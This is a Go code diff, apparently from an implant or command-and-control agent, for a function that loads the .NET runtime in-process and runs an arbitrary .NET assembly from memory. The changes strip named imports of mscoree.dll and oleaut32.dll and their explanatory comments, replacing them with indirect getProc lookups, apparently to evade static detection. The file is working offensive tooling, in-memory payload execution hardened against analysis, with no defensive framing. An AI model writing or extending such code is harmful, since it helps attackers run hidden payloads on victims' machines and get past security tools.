@@ -9,11 +9,6 @@ import (
 	"unsafe"
 )
 
-var (
-	mscoree    = syscall.NewLazyDLL("mscoree.dll")
-	pCLRCreate = mscoree.NewProc("CLRCreateInstance")
-)
-
 // CLR GUIDs
 var (
 	CLSID_CLRMetaHost = GUID{0x9280188d, 0x0e8e, 0x4867, [8]byte{0xb3, 0x0c, 0x7f, 0xa8, 0x38, 0x84, 0xe8, 0xde}}
@@ -105,8 +100,9 @@ func executeAssembly(data []byte, args string) string {
 		return "Error: empty assembly data"
 	}
 
+	clrCreate := getProc(mMscoree, fCLRCreateInstance)
 	var metaHost *iCLRMetaHost
-	hr, _, _ := pCLRCreate.Call(
+	hr, _, _ := syscall.SyscallN(clrCreate,
 		uintptr(unsafe.Pointer(&CLSID_CLRMetaHost)),
 		uintptr(unsafe.Pointer(&IID_ICLRMetaHost)),
 		uintptr(unsafe.Pointer(&metaHost)),
@@ -151,7 +147,7 @@ func executeAssembly(data []byte, args string) string {
 	}
 
 	hr, _, _ = syscall.SyscallN(runtimeHost.vtbl.Start, uintptr(unsafe.Pointer(runtimeHost)))
-	if hr != 0 && hr != 1 { // S_FALSE (1) means already started
+	if hr != 0 && hr != 1 {
 		return fmt.Sprintf("Error: CLR Start failed (0x%08x)", hr)
 	}
 
@@ -165,11 +161,10 @@ func executeAssembly(data []byte, args string) string {
 		return fmt.Sprintf("Error: GetDefaultDomain failed (0x%08x)", hr)
 	}
 
-	// QI for _AppDomain
 	IID_AppDomain := GUID{0x05f696dc, 0x2b29, 0x3663, [8]byte{0xad, 0x8b, 0xc4, 0x38, 0x9c, 0xf2, 0xa7, 0x13}}
 	var appDomain uintptr
 	hr, _, _ = syscall.SyscallN(
-		*(*uintptr)(unsafe.Pointer(*(*uintptr)(unsafe.Pointer(appDomainIUnk)))), // QueryInterface
+		*(*uintptr)(unsafe.Pointer(*(*uintptr)(unsafe.Pointer(appDomainIUnk)))),
 		appDomainIUnk,
 		uintptr(unsafe.Pointer(&IID_AppDomain)),
 		uintptr(unsafe.Pointer(&appDomain)),
@@ -183,9 +178,7 @@ func executeAssembly(data []byte, args string) string {
 		return "Error: failed to create SafeArray for assembly"
 	}
 
-	// _AppDomain.Load_3(safeArray) -> _Assembly
 	appDomainVtbl := *(*uintptr)(unsafe.Pointer(appDomain))
-	// Load_3 is at vtbl offset 44 (11th method from IDispatch base at index 7+37=44 on x64)
 	loadOffset := uintptr(44 * unsafe.Sizeof(uintptr(0)))
 	var assembly uintptr
 	hr, _, _ = syscall.SyscallN(
@@ -198,7 +191,6 @@ func executeAssembly(data []byte, args string) string {
 		return fmt.Sprintf("Error: AppDomain.Load failed (0x%08x)", hr)
 	}
 
-	// _Assembly.get_EntryPoint -> MethodInfo
 	assemblyVtbl := *(*uintptr)(unsafe.Pointer(assembly))
 	getEntryPointOffset := uintptr(14 * unsafe.Sizeof(uintptr(0)))
 	var entryPointMethod uintptr
@@ -219,18 +211,16 @@ func executeAssembly(data []byte, args string) string {
 		argArray = createEmptySafeArrayOfStrings()
 	}
 
-	// Wrap argArray in a VARIANT, then in a 1-element SafeArray of VARIANT
 	paramArray := createInvokeParams(argArray)
 
-	// MethodInfo.Invoke_3(obj=null, params)
 	methodVtbl := *(*uintptr)(unsafe.Pointer(entryPointMethod))
 	invokeOffset := uintptr(26 * unsafe.Sizeof(uintptr(0)))
-	var retVal [24]byte // VARIANT
+	var retVal [24]byte
 	hr, _, _ = syscall.SyscallN(
 		*(*uintptr)(unsafe.Pointer(methodVtbl + invokeOffset)),
 		entryPointMethod,
-		0,          // null object (static Main)
-		paramArray, // SafeArray of VARIANT
+		0,
+		paramArray,
 		uintptr(unsafe.Pointer(&retVal[0])),
 	)
 	if hr != 0 {
@@ -242,15 +232,6 @@ func executeAssembly(data []byte, args string) string {
 
 // OLE Automation helpers
 
-var (
-	oleaut32           = syscall.NewLazyDLL("oleaut32.dll")
-	pSafeArrayCreate   = oleaut32.NewProc("SafeArrayCreate")
-	pSafeArrayPutElement = oleaut32.NewProc("SafeArrayPutElement")
-	pSafeArrayAccessData = oleaut32.NewProc("SafeArrayAccessData")
-	pSafeArrayUnaccessData = oleaut32.NewProc("SafeArrayUnaccessData")
-	pSysAllocString    = oleaut32.NewProc("SysAllocString")
-)
-
 type safeArrayBound struct {
 	Elements uint32
 	LBound   int32
@@ -258,7 +239,8 @@ type safeArrayBound struct {
 
 func createSafeArrayFromBytes(data []byte) uintptr {
 	bound := safeArrayBound{Elements: uint32(len(data)), LBound: 0}
-	sa, _, _ := pSafeArrayCreate.Call(
+	saCreate := getProc(mOleaut32, fSafeArrayCreate)
+	sa, _, _ := syscall.SyscallN(saCreate,
 		17, // VT_UI1
 		1,
 		uintptr(unsafe.Pointer(&bound)),
@@ -268,18 +250,21 @@ func createSafeArrayFromBytes(data []byte) uintptr {
 	}
 
 	var pData uintptr
-	hr, _, _ := pSafeArrayAccessData.Call(sa, uintptr(unsafe.Pointer(&pData)))
+	saAccess := getProc(mOleaut32, fSafeArrayAccessData)
+	hr, _, _ := syscall.SyscallN(saAccess, sa, uintptr(unsafe.Pointer(&pData)))
 	if hr != 0 {
 		return 0
 	}
 	copy(unsafe.Slice((*byte)(unsafe.Pointer(pData)), len(data)), data)
-	pSafeArrayUnaccessData.Call(sa)
+	saUnaccess := getProc(mOleaut32, fSafeArrayUnaccessData)
+	syscall.SyscallN(saUnaccess, sa)
 	return sa
 }
 
 func createSafeArrayOfStrings(strs []string) uintptr {
 	bound := safeArrayBound{Elements: uint32(len(strs)), LBound: 0}
-	sa, _, _ := pSafeArrayCreate.Call(
+	saCreate := getProc(mOleaut32, fSafeArrayCreate)
+	sa, _, _ := syscall.SyscallN(saCreate,
 		8, // VT_BSTR
 		1,
 		uintptr(unsafe.Pointer(&bound)),
@@ -287,29 +272,32 @@ func createSafeArrayOfStrings(strs []string) uintptr {
 	if sa == 0 {
 		return 0
 	}
+	saPut := getProc(mOleaut32, fSafeArrayPutElement)
+	sysAlloc := getProc(mOleaut32, fSysAllocString)
 	for i, s := range strs {
 		wstr, _ := syscall.UTF16PtrFromString(s)
-		bstr, _, _ := pSysAllocString.Call(uintptr(unsafe.Pointer(wstr)))
+		bstr, _, _ := syscall.SyscallN(sysAlloc, uintptr(unsafe.Pointer(wstr)))
 		idx := int32(i)
-		pSafeArrayPutElement.Call(sa, uintptr(unsafe.Pointer(&idx)), bstr)
+		syscall.SyscallN(saPut, sa, uintptr(unsafe.Pointer(&idx)), bstr)
 	}
 	return sa
 }
 
 func createEmptySafeArrayOfStrings() uintptr {
 	bound := safeArrayBound{Elements: 0, LBound: 0}
-	sa, _, _ := pSafeArrayCreate.Call(8, 1, uintptr(unsafe.Pointer(&bound)))
+	saCreate := getProc(mOleaut32, fSafeArrayCreate)
+	sa, _, _ := syscall.SyscallN(saCreate, 8, 1, uintptr(unsafe.Pointer(&bound)))
 	return sa
 }
 
 func createInvokeParams(stringArraySA uintptr) uintptr {
-	// VARIANT: VT_ARRAY | VT_BSTR (0x2008), data = stringArraySA
 	var variant [24]byte
-	*(*uint16)(unsafe.Pointer(&variant[0])) = 0x2008 // vt
+	*(*uint16)(unsafe.Pointer(&variant[0])) = 0x2008
 	*(*uintptr)(unsafe.Pointer(&variant[8])) = stringArraySA
 
 	bound := safeArrayBound{Elements: 1, LBound: 0}
-	sa, _, _ := pSafeArrayCreate.Call(
+	saCreate := getProc(mOleaut32, fSafeArrayCreate)
+	sa, _, _ := syscall.SyscallN(saCreate,
 		12, // VT_VARIANT
 		1,
 		uintptr(unsafe.Pointer(&bound)),
@@ -318,7 +306,8 @@ func createInvokeParams(stringArraySA uintptr) uintptr {
 		return 0
 	}
 
+	saPut := getProc(mOleaut32, fSafeArrayPutElement)
 	idx := int32(0)
-	pSafeArrayPutElement.Call(sa, uintptr(unsafe.Pointer(&idx)), uintptr(unsafe.Pointer(&variant[0])))
+	syscall.SyscallN(saPut, sa, uintptr(unsafe.Pointer(&idx)), uintptr(unsafe.Pointer(&variant[0])))
 	return sa
 }
